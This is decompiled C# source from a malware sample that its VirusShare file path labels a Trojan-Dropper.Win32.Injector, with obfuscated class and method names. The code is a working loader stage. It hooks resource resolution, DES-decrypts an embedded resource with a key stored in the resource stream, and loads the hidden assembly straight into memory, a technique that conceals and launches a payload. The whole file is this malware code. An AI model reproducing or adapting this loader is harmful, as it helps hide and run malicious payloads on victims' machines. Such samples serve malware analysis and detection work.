// Decompiled with JetBrains decompiler
// Type: JD0=.Jj0=
// Assembly: Function 1, Version=1.0.0.1, Culture=neutral
// MVID: 983559CB-D82D-4F02-AC60-92CA32F4CD89
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.dblt-06a9a4f2c72b6121d9e863f00887a90ab96f02255aafa258ae7ef087adabc7bb.exe

using JD0\u003D;
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace JD0\u003D
{
  public class Jj0\u003D
  {
    private static Assembly Jz0\u003D;
    private static string[] KD0\u003D = new string[0];

    [Obfuscation]
    public static void rrr() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Jj0\u003D.KT0\u003D);

    public static Assembly KT0\u003D(object _param0, ResolveEventArgs _param1)
    {
      if ((object) Jj0\u003D.Jz0\u003D == null)
      {
        lock (Jj0\u003D.KD0\u003D)
        {
          using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("{FEA94A50-E5C8-4edd-BE62-F738BC8C043E}"))
          {
            Jj0\u003D.Jz0\u003D = Assembly.Load(Jj0\u003D.LD0\u003D(manifestResourceStream));
            if ((object) Jj0\u003D.Jz0\u003D != null)
              Jj0\u003D.KD0\u003D = Jj0\u003D.Jz0\u003D.GetManifestResourceNames();
          }
        }
      }
      string name = _param1.Name;
      for (int index = 0; index < Jj0\u003D.KD0\u003D.Length; ++index)
      {
        if (Jj0\u003D.KD0\u003D[index] == name)
          return Jj0\u003D.Jz0\u003D;
      }
      return (Assembly) null;
    }

    private static byte[] LD0\u003D(Stream _param0)
    {
      BinaryReader binaryReader = new BinaryReader(_param0);
      string s = binaryReader.ReadString();
      byte[] buffer = binaryReader.ReadBytes((int) (_param0.Length - _param0.Position));
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      cryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
      cryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s);
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
      MemoryStream memoryStream = new MemoryStream(buffer);
      return new BinaryReader((Stream) new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read)).ReadBytes((int) memoryStream.Length);
    }
  }
}
